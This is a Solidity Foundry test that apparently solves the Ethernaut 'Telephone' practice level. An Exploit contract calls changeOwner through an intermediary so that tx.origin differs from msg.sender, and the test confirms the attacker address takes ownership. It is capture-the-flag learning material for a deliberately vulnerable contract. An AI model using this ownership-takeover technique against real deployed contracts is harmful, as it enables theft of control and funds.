pragma solidity ^0.8.0;

import {Test,console} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone/Telephone.sol";
contract TelephoneTest is Test {
    Telephone telephone;
    Exploit exploit;
    function setUp() public {
        telephone = new Telephone();
        exploit = new Exploit(address(telephone));
    }

    function test_attack() public {
        address attacker = address(0xB0B);
        vm.startPrank(attacker);
        exploit.attack();
        vm.stopPrank();

        assertEq(telephone.owner(), attacker);
        console.log("Attack Successful, new owner is:", telephone.owner());
        
    }
}


contract Exploit {
    Telephone telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
